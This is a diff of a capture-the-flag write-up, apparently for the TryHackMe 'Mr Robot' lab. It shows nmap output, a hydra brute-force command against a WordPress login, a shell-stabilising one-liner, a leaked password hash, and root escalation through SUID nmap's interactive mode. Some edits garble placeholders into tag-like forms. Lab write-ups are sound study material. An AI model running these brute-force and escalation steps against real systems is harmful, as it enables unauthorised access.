@@ -42,7 +42,7 @@ the "all in one":
 PORT    STATE  SERVICE  VERSION
 22/tcp  closed ssh
 80/tcp  open   http     Apache httpd
-| http-methods: 
+| http-methods:
 |_  Supported Methods: GET HEAD POST OPTIONS
 |_http-title: Site doesn't have a title (text/html).
 |_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
@@ -59,7 +59,7 @@ PORT    STATE  SERVICE  VERSION
 | Not valid after:  2025-09-13T10:45:03
 | MD5:   3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97
 |_SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
-| http-methods: 
+| http-methods:
 |_  Supported Methods: GET HEAD POST OPTIONS
 |_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
 Device type: general purpose|specialized|storage-misc|broadband router|printer|WAP
@@ -158,7 +158,7 @@ use hydra + `fsocity.dic` file to brute force the wp-admin login page.
 
 Use hydra and the `fsocity.dic` file to brute-force the login.
 
-Format: `hydra -l <login> -P <path/to/wordlist> <ip> <module> '/path/to/login.php:login-request&password=^PASS^:failure-message'`
+Format: `hydra -l <login /> -P <path/to/wordlist /> <ip /> <module /> '/path/to/login.php:login-request&password=^PASS^:failure-message'`
 
 I use the following payload to set password as fixed and run through the `./fsocity.dic` file to find valid username i.e. when you get a response that doesn't get `Invalid username` returned:
 
@@ -167,9 +167,9 @@ payload: `hydra -L ./fsocity.dic -p password 10.10.235.193 -V http-post-form '/w
 ```bash
 hydra -L ./fsocity.dic -p password 10.10.235.193 -V http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:Invalid username'
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations
-, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).                             
-                                                                                                                      
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-02 23:02:35                                    
+, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-02 23:02:35
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task
 [DATA] attacking http-post-form://10.10.235.193:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:Invalid username
 [ATTEMPT] target 10.10.235.193 - login "true" - pass "password" - 1 of 858235 [child 0] (0/0)
@@ -282,7 +282,7 @@ $
 stabilize with python
 
 ```bash
-$ 
+$
 which python
 /usr/bin/python
 /usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
@@ -320,7 +320,7 @@ id;whoami
 id;whoami
 uid=1(daemon) gid=1(daemon) groups=1(daemon)
 daemon
-daemon@linux:/home/robot$ 
+daemon@linux:/home/robot$
 ```
 
 found `/home/robot` flag, can't read flag, but can read the other file:
@@ -334,7 +334,7 @@ total 8
 cat password.raw-md5
 cat password.raw-md5
 robot:c3fcd3d76192e4007dfb496cca67e13b
-daemon@linux:/home/robot$ 
+daemon@linux:/home/robot$
 ```
 
 ### Crack
@@ -390,7 +390,7 @@ total 8
 cat key-2-of-3.txt
 cat key-2-of-3.txt
 822c73956184f694993bede3eb39f959
-robot@linux:~$ 
+robot@linux:~$
 ```
 
 ## FLAG 3
@@ -414,9 +414,9 @@ abcdefghijklmnopqrstuvwxyz
 
 /usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
 /usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
-robot@linux:~$ 
+robot@linux:~$
 
-robot@linux:~$ 
+robot@linux:~$
 
 ls -al
 ls -al
@@ -436,16 +436,16 @@ try find SUIDs
 find / -perm /4000
 /bin/ping
 /bin/umount
-/bin/mount 
-/bin/ping6 
-/bin/su    
+/bin/mount
+/bin/ping6
+/bin/su
 find: `/etc/ssl/private': Permission denied
 /usr/bin/passwd
 /usr/bin/newgrp
-/usr/bin/chsh  
-/usr/bin/chfn  
+/usr/bin/chsh
+/usr/bin/chfn
 /usr/bin/gpasswd
-/usr/bin/sudo   
+/usr/bin/sudo
 /usr/local/bin/nmap
 /usr/lib/openssh/ssh-keysign
 /usr/lib/eject/dmcrypt-get-device
@@ -459,7 +459,7 @@ find: `/root': Permission denied
 
 I intially looked at `/usr/lib/pt_chown` but the THM hint said "nmap", and I can see it there `/usr/local/bin/nmap`
 
-nmap has an "interactive mode" that `"! <command>   -- runs shell command given in the foreground"`
+nmap has an "interactive mode" that `"! <command />   -- runs shell command given in the foreground"`
 
 ```bash
 ls -l /usr/local/bin/nmap
@@ -468,19 +468,19 @@ ls -l /usr/local/bin/nmap
 /usr/local/bin/nmap --interactive
 
 Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
-Welcome to Interactive Mode -- press h <enter> for help
+Welcome to Interactive Mode -- press h <enter /> for help
 sh
 sh
-Unknown command (sh) -- press h <enter> for help
+Unknown command (sh) -- press h <enter /> for help
 h
 h
 Nmap Interactive Commands:
-n <nmap args> -- executes an nmap scan using the arguments given and
+n <nmap args /> -- executes an nmap scan using the arguments given and
 waits for nmap to finish.  Results are printed to the
 screen (of course you can still use file output commands).
-! <command>   -- runs shell command given in the foreground
+! <command />   -- runs shell command given in the foreground
 x             -- Exit Nmap
-f [--spoof <fakeargs>] [--nmap_path <path>] <nmap args>
+f [--spoof <fakeargs />] [--nmap_path <path />] <nmap args />
 -- Executes nmap in the background (results are NOT
 printed to the screen).  You should generally specify a
 file for results (with -oX, -oG, or -oN).  If you specify
@@ -498,7 +498,7 @@ f --spoof "/usr/local/bin/pico -z hello.c" -sS -oN e.log example.com/24
 id
 id
 uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
-# 
+#
 ```
 
 flag 3
